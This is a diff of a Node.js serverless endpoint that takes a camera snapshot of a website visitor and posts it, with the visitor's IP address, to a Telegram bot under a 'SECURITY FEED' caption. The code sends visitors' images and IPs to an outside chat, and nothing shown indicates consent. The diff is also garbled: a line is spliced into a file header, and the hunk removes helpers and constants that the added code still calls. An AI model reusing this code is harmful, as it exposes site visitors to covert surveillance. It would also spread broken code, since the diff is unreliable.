@@ -33,39 +33,67 @@ module.exports = async function handler(req, res) {
   try {
     const ip =
       (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
-      req.headers['x-real-ip'] ||// api/cam.js — receives visitor camera snap and forwards to Telegram with SOC caption
-const TOKEN = process.env.TG_BOT_TOKEN;
-const CHAT = process.env.TG_CHAT_ID;
-
-const recentSnaps = new Map();
-const COOLDOWN_MS = 8 * 1000; // 8s debounce per IP
-
-function cleanupOldSnaps() {
-  const now = Date.now();
-  for (const [ip, time] of recentSnaps.entries()) {
-    if (now - time > COOLDOWN_MS) recentVisitors.delete(ip);
-  }
-}
-
-function extractPhoto(body) {
-  if (!body) return null;
-  if (typeof body === 'object' && !Buffer.isBuffer(body) && body.photo) return body.photo;
-  if (typeof body === 'string') {
-    try { return JSON.parse(body).photo || null; } catch (e) {}
-  }
-  if (Buffer.isBuffer(body)) {
-    try { return JSON.parse(body.toString()).photo || null; } catch (e) {}
-  }
-  return null;
-}
-
-module.exports = async function handler(req, res) {
-  if (req.method !== 'POST') {
-    res.setHeader('Content-Type', 'application/json');
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
-
-  try {
-    const ip =
-      (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
       req.headers['x-real-ip'] ||
+      req.socket?.remoteAddress ||
+      '';
+
+    const now = Date.now();
+    cleanupOldSnaps();
+
+    if (ip && recentSnaps.has(ip)) {
+      const lastSnap = recentSnaps.get(ip);
+      if (now - lastSnap < COOLDOWN_MS) {
+        res.setHeader('Content-Type', 'application/json');
+        return res.status(200).json({ ok: true, skipped: 'debounced' });
+      }
+    }
+    if (ip) recentSnaps.set(ip, now);
+
+    let photo = extractPhoto(req.body);
+
+    if (!photo && req.readable) {
+      const raw = await new Promise((resolve) => {
+        const chunks = [];
+        req.on('data', (c) => chunks.push(c));
+        req.on('end', () => resolve(Buffer.concat(chunks)));
+        req.on('error', () => resolve(null));
+      });
+      if (raw) photo = extractPhoto(raw);
+    }
+
+    if (!photo) {
+      res.setHeader('Content-Type', 'application/json');
+      return res.status(400).json({ error: 'No photo provided' });
+    }
+
+    const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
+    const buffer = Buffer.from(base64Data, 'base64');
+
+    const tgForm = new FormData();
+    tgForm.append('chat_id', CHAT);
+    tgForm.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'security_snap.jpg');
+
+    let caption = '📸 <b>SECURITY FEED // VISITOR SNAPSHOT</b>';
+    if (ip) caption += `\n🌐 <b>IP Address:</b> <code>${ip}</code>`;
+
+    tgForm.append('caption', caption);
+    tgForm.append('parse_mode', 'HTML');
+
+    const tgRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: tgForm,
+    });
+
+    if (!tgRes.ok) {
+      const errText = await tgRes.text();
+      res.setHeader('Content-Type', 'application/json');
+      return res.status(502).json({ error: 'Telegram failed', tgError: errText });
+    }
+
+    res.setHeader('Content-Type', 'application/json');
+    return res.status(200).json({ ok: true });
+  } catch (err) {
+    res.setHeader('Content-Type', 'application/json');
+    return res.status(500).json({ error: 'Forward failed', message: err.message });
+  }
+};
